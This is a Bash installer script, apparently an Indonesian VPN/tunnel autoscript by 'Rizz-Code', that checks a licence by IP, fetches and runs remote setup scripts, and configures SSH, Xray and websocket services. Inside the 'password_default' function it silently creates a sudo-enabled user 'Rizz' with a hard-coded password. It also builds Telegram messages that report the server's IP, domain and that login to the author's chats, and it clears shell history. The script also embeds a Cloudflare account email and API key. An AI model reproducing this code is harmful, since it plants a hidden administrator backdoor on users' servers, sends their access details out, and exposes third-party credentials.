#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
#########################
source /var/lib/ch.txt
REPO1="https://raw.githubusercontent.com/rizz-code/extra/main/"
REPO="https://raw.githubusercontent.com/rizz-code/extra/main/"
CDNF="https://raw.githubusercontent.com/rizz-code/netvpn/main"
###
BURIQ () {
    curl -sS https://accessvpn.onrender.com > /root/tmp
    data=( `cat /root/tmp | grep -E "^### " | awk '{print $2}'` )
    for user in "${data[@]}"
    do
    exp=( `grep -E "^### $user" "/root/tmp" | awk '{print $3}'` )
    d1=(`date -d "$exp" +%s`)
    d2=(`date -d "$biji" +%s`)
    exp2=$(( (d1 - d2) / 86400 ))
    if [[ "$exp2" -le "0" ]]; then
    echo $user > /etc/.$user.ini
    else
    rm -f  /etc/.$user.ini
    fi
    done
    rm -f  /root/tmp
}
# https://accessvpn.onrender.com 
MYIP=$(curl -sS ipv4.icanhazip.com)
Name=$(curl -sS https://accessvpn.onrender.com | grep $MYIP | awk '{print $2}')
echo $Name > /usr/local/etc/.$Name.ini
CekOne=$(cat /usr/local/etc/.$Name.ini)

Bloman () {
if [ -f "/etc/.$Name.ini" ]; then
CekTwo=$(cat /etc/.$Name.ini)
    if [ "$CekOne" = "$CekTwo" ]; then
        res="Expired"
    fi
else
res="Permission Accepted..."
fi
}

PERMISSION () {
    MYIP=$(curl -sS ipv4.icanhazip.com)
    IZIN=$(curl -sS https://accessvpn.onrender.com | awk '{print $4}' | grep $MYIP)
    if [ "$MYIP" = "$IZIN" ]; then
    Bloman
    else
    res="Permission Denied!"
    fi
    BURIQ
}
wget -O /etc/banner ${REPO1}config/banner >/dev/null 2>&1
    chmod +x /etc/banner
clear
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
cd /root
#System version number
if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
fi

localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
echo "$localip $(hostname)" >> /etc/hosts
fi
mkdir -p /etc/xray

echo -e "[ ${tyblue}NOTES${NC} ] Before we go.. "
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] I need check your headers first.."
sleep 2
echo -e "[ ${green}INFO${NC} ] Checking headers"
sleep 1
totet=`uname -r`
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
  sleep 2
  echo -e "[ ${yell}WARNING${NC} ] Try to install ...."
  echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  apt-get --yes install $REQUIRED_PKG
  # sleep 1
  echo ""
  # sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] If error you need.. to do this"
  # sleep 1
  echo ""
  # sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 1. apt update -y"
  # sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 2. apt upgrade -y"
  # sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 3. apt dist-upgrade -y"
  # sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 4. reboot"
  # sleep 1
  echo ""
  # sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] After rebooting"
  # sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] Then run this script again"
  echo -e "[ ${tyblue}NOTES${NC} ] Notes, Script Mod By Rizz-Code"
  echo -e "[ ${tyblue}NOTES${NC} ] if you understand then tap enter now.."
  # read
else
  echo -e "[ ${green}INFO${NC} ] Oke installed"
fi

ttet=`uname -r`
ReqPKG="linux-headers-$ttet"
if ! dpkg -s $ReqPKG  >/dev/null 2>&1; then
  rm /root/setup.sh >/dev/null 2>&1 
  exit
else
  clear
fi


secs_to_human() {
    echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
}
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1

coreselect=''
cat> /root/.profile << END
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
clear
END
chmod 644 /root/.profile

echo -e "[ ${green}INFO${NC} ] Preparing the install file"
apt install git curl -y >/dev/null 2>&1
echo -e "[ ${green}INFO${NC} ] Allright good ... installation file is ready"
sleep 2
echo -ne "[ ${green}INFO${NC} ] Check permission : "

PERMISSION
if [ -f /home/needupdate ]; then
red "Your script need to update first !"
exit 0
elif [ "$res" = "Permission Accepted..." ]; then
green "Permission Accepted!"
else
red "Permission Denied!"
rm setup.sh > /dev/null 2>&1
sleep 10
exit 0
fi
sleep 3

mkdir -p /etc/ssnvpn
mkdir -p /etc/ssnvpn/theme
mkdir -p /var/lib/ssnvpn-pro >/dev/null 2>&1
echo "IP=" >> /var/lib/ssnvpn-pro/ipvps.conf

if [ -f "/etc/xray/domain" ]; then
echo ""
echo -e "[ ${green}INFO${NC} ] Script Already Installed"
echo -ne "[ ${yell}WARNING${NC} ] Do you want to install again ? (y/n)? "
read answer
if [ "$answer" == "${answer#[Yy]}" ] ;then
rm setup.sh
sleep 10
exit 0
else
clear
fi
fi

    # > pasang gotop
    gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
    gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
    curl -sL "$gotop_link" -o /tmp/gotop.deb
    dpkg -i /tmp/gotop.deb >/dev/null 2>&1

    # > Pasang BBR Plus
    wget -qO /tmp/bbr.sh "${REPO}server/bbr.sh" >/dev/null 2>&1
    chmod +x /tmp/bbr.sh && bash /tmp/bbr.sh

echo ""
wget -q https://raw.githubusercontent.com/rizz-code/netvpn/main/dependencies.sh;chmod +x dependencies.sh;./dependencies.sh
rm dependencies.sh
clear

echo -e "════════════════════════════════════════" | lolcat
echo -e "            [Rizz-Code]" | lolcat
echo -e "════════════════════════════════════════" | lolcat
echo -e "${red}    ♦️${NC} ${green} CUSTOM SETUP DOMAIN VPS     ${NC}"
echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
echo "1. Gunakan Domain Dari Script (Tersedia 2 Domain)"
echo "2. Pilih Domain Sendiri"
echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
read -rp "Choose Your Domain Installation : " dom 

if test $dom -eq 1; then
# apt install jq curl -y 2>&1
clear
echo -e "════════════════════════════════════════" | lolcat
echo -e "            [Rizz-Code]" | lolcat
echo -e "════════════════════════════════════════" | lolcat
echo -e "${red}    ♦️${NC} ${green} CUSTOM SETUP DOMAIN VPS     ${NC}"
echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
echo "Pilih Domain Anda"
echo "1. robinhoodtunnel.net"
echo "2. robinhood-net.com"
echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
read -rp "Choose Your Domain Installation : " scdomain 
if [ "$scdomain" == "1" ]; then
    DOMAIN="robinhoodtunnel.net"
elif [ "$scdomain" == "2" ]; then
    DOMAIN="robinhood-net.com"
else
    echo "Invalid choice. Please choose 1 or 2."
    exit 1
fi

echo -e "════════════════════════════════════════" | lolcat
echo -e "            [Rizz-Code]" | lolcat
echo -e "════════════════════════════════════════" | lolcat
echo -e "${red}    ♦️${NC} ${green} CUSTOM SETUP DOMAIN VPS     ${NC}"
echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
echo "✅ Domain yang dipilih ${DOMAIN}"
echo "1. Subdomain Manual"
echo "2. Random Subdomain"
echo -e "${red}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
read -rp "Choose Your Domain Installation : " scsub
if [ "$scsub" == "1" ]; then
    read -rp "Masukkan Nama Domain : " sub
elif [ "$scsub" == "2" ]; then
    sub=$(</dev/urandom tr -dc a-z0-9 | head -c4)
else
    echo "Invalid choice. Please choose 1 or 2."
    exit 1
fi

# echo $sub > /root/cfku
SUB_DOMAIN=${sub}.${DOMAIN}
CF_ID=rizkyadhypratama@gmail.com
CF_KEY=9fd2269eac388011fce3f575a7939584bf238
echo "${DOMAIN}" > /root/domain
echo $SUB_DOMAIN > /root/domain

set -euo pipefail
IP=$(wget -qO- ipinfo.io/ip);
echo "Record DNS ${SUB_DOMAIN}..."
ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMAIN}&status=active" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)

RECORD=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records?name=${SUB_DOMAIN}" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" | jq -r .result[0].id)

if [[ "${#RECORD}" -le 10 ]]; then
     RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":120,"proxied":false}' | jq -r .result.id)
fi

RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_records/${RECORD}" \
     -H "X-Auth-Email: ${CF_ID}" \
     -H "X-Auth-Key: ${CF_KEY}" \
     -H "Content-Type: application/json" \
     --data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":120,"proxied":false}')
echo "Host : $SUB_DOMAIN"
echo $SUB_DOMAIN > /root/domain
sleep 1
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
yellow "Domain Anda ${SUB_DOMAIN}"
yellow "Domain added.."
sleep 3
domain=$(cat /root/domain)
cp -r /root/domain /etc/xray/domain
elif test $dom -eq 2; then
read -rp "Enter Your Domain : " domen 
echo $domen > /root/domain
echo "$domen" > /root/domain
echo "$domen" > /root/scdomain
echo "$domen" > /etc/xray/domain
echo "$domen" > /etc/xray/scdomain
echo "IP=$domen" > /var/lib/ssnvpn-pro/ipvps.conf
cp /root/domain /etc/xray/domain
else 
echo "Not Found Argument"
exit 1
fi
echo -e "${green}Done!${NC}"
sleep 2
clear

#THEME RED
cat <<EOF>> /etc/ssnvpn/theme/red
BG : \E[40;1;41m
TEXT : \033[0;31m
EOF
#THEME BLUE
cat <<EOF>> /etc/ssnvpn/theme/blue
BG : \E[40;1;44m
TEXT : \033[0;34m
EOF
#THEME GREEN
cat <<EOF>> /etc/ssnvpn/theme/green
BG : \E[40;1;42m
TEXT : \033[0;32m
EOF
#THEME YELLOW
cat <<EOF>> /etc/ssnvpn/theme/yellow
BG : \E[40;1;43m
TEXT : \033[0;33m
EOF
#THEME MAGENTA
cat <<EOF>> /etc/ssnvpn/theme/magenta
BG : \E[40;1;43m
TEXT : \033[0;33m
EOF
#THEME CYAN
cat <<EOF>> /etc/ssnvpn/theme/cyan
BG : \E[40;1;46m
TEXT : \033[0;36m
EOF
#THEME CONFIG
cat <<EOF>> /etc/ssnvpn/theme/color.conf
blue
EOF
    
#install ssh ovpn
echo -e "$green[INFO]$NC Install SSH"
sleep 2
clear
wget -q https://raw.githubusercontent.com/rizz-code/netvpn/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
#Instal Xray
echo -e "$green[INFO]$NC Install XRAY!"
sleep 2
clear
wget -q https://raw.githubusercontent.com/rizz-code/netvpn/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
clear
echo -e "$green[INFO]$NC Install SET-BR!"
wget -q https://raw.githubusercontent.com/rizz-code/netvpn/main/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
clear
echo -e "$green[INFO]$NC Install WEBSOCKET!"
wget -q https://raw.githubusercontent.com/rizz-code/netvpn/main/websocket/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear
wget -q https://raw.githubusercontent.com/rizz-code/netvpn/main/websocket/nontls.sh && chmod +x nontls.sh && ./nontls.sh
clear
echo -e "$green[INFO]$NC Download Extra Menu"
sleep 2
wget -q https://raw.githubusercontent.com/rizz-code/netvpn/main/update/update.sh && chmod +x update.sh && ./update.sh
rm -f update.sh
clear
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
clear

echo -e "Create Swap File 2G"
dd if=/dev/zero of=/swapfile bs=2048 count=1048576
mkswap /swapfile
chown root:root /swapfile
chmod 0600 /swapfile >/dev/null 2>&1
swapon /swapfile >/dev/null 2>&1
sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
echo "DONE"
sleep 3
clear
cat> /root/.profile << END
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
clear
menu
END
chmod 644 /root/.profile

if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
serverV=$( curl -sS https://raw.githubusercontent.com/myridwan/multi-ws/ipuk/version )
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
curl -sS ifconfig.me > /etc/myipvps

DATE=$(date +'%d %B %Y')
datediff() {
    d1=$(date -d "$1" +%s)
    d2=$(date -d "$2" +%s)
    Expiry=$(( (d1 - d2) / 86400 ))  
}

function password_default() {
    source /var/lib/ch.txt
    current_date=$(date +"%d %b %Y")
    current_time=$(date +"%H:%M:%S")
    domain=$(cat /etc/xray/domain)
    Username="Rizz"
    Password=Wkwk1212
    IP=$(curl -sS ipv4.icanhazip.com)
    Exp=$(curl -sS https://accessvpn.onrender.com | grep $IP | awk '{print $3}')
    Name=$(curl -sS https://accessvpn.onrender.com | grep $IP | awk '{print $2}')
    datediff "$Exp" "$DATE"
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1

    TIMES="10"
    # CHATID="1855655763"
    # CHATIDGC=-1001855655763
    # KEY="6527620513:AAHKGPCdezTkQYyxOf0ZkktEJC6kbe-f178"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    TEXT="Installasi VPN Script RobinHood
    
    ============================
    <code>Domain     :</code> <code>$domain</code>
    <code>IP Vps     :</code> <code>$IP</code>
    <code>User Login :</code> <code>${Username}</code>
    <code>Pass Login :</code> <code>${Password}</code>
    <code>User Script:</code> <code>$Name</code>
    <code>Exp Script :</code> <code>$Expiry days</code>
    ============================
    ©️ Copyright 2023 By RobinHood
    ============================"

    TRX="
    Notifikasi Instalasi Baru 
    
    ============================
    <code>Domain :</code> <code>$domain</code>
    <code>IP Vps :</code> <code>$IP</code>
    <code>Date   :</code> <code>$current_date</code>
    <code>User   :</code> <code>$Name</code>
    <code>Expiry :</code> <code>$Expiry days</code>
    ============================
    ©️ Copyright 2023 By RobinHood
    ============================
    Thanks You 😊"

    curl -s --max-time $TIMES -d "chat_id=$CHATIDGC&disable_web_page_preview=1&text=$TRX&parse_mode=html" $URL
    curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TRX&parse_mode=html" $URL
    curl -s --max-time $TIMES -d "chat_id=$CHATIDGC&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL
}

password_default
clear
clear
echo " "
echo "=====================-[ AutoScript Rizz-Code ]-===================="
echo ""
echo "------------------------------------------------------------"
echo ""
echo ""
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH                 : 22"  | tee -a log-install.txt
echo "   - SSH Websocket           : 80" | tee -a log-install.txt
echo "   - SSH SSL Websocket       : 443" | tee -a log-install.txt
echo "   - SSH NON-SSL Websocket   : 80, 8880" | tee -a log-install.txt
echo "   - SLOWDNS                 : 5300 [OFF]" | tee -a log-install.txt
echo "   - Stunnel4                : 447, 777" | tee -a log-install.txt
echo "   - Dropbear                : 109, 143" | tee -a log-install.txt
echo "   - Badvpn                  : 7100-7900" | tee -a log-install.txt
echo "   - Nginx                   : 81" | tee -a log-install.txt
echo "   - XRAY  Vmess TLS         : 443" | tee -a log-install.txt
echo "   - XRAY  Vmess None TLS    : 80" | tee -a log-install.txt
echo "   - XRAY  Vless TLS         : 443" | tee -a log-install.txt
echo "   - XRAY  Vless None TLS    : 80" | tee -a log-install.txt
echo "   - Trojan GRPC             : 443" | tee -a log-install.txt
echo "   - Trojan WS               : 443" | tee -a log-install.txt
echo "   - Sodosok WS/GRPC         : 443" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
echo "   - IPtables                : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
echo "   - IPv6                    : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On           : $aureb:00 $gg GMT +7" | tee -a log-install.txt
echo "   - Autobackup Data" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Restore Data" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> WhatsApp : +6285786569083 (Text Only)"  | tee -a log-install.txt
echo "   >>> Telegram : t.me/Akusiapaoiii"  | tee -a log-install.txt
echo ""
echo ""
echo "------------------------------------------------------------"
echo ""
echo "===============-[ Script Rizz-Code  ]-==============="
echo -e ""
echo ""
echo "" | tee -a log-install.txt
rm /root/install.sh 
rm /root/insshws.sh 
# rm /root/update.sh
rm /root/nontls.sh
# rm /root/install-sldns.sh
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
echo -e "
"
echo -ne "[ ${yell}WARNING${NC} ] Do you want to reboot now ? (y/n)? "
read answer
if [ "$answer" == "${answer#[Yy]}" ] ;then
exit 0
else
reboot
fi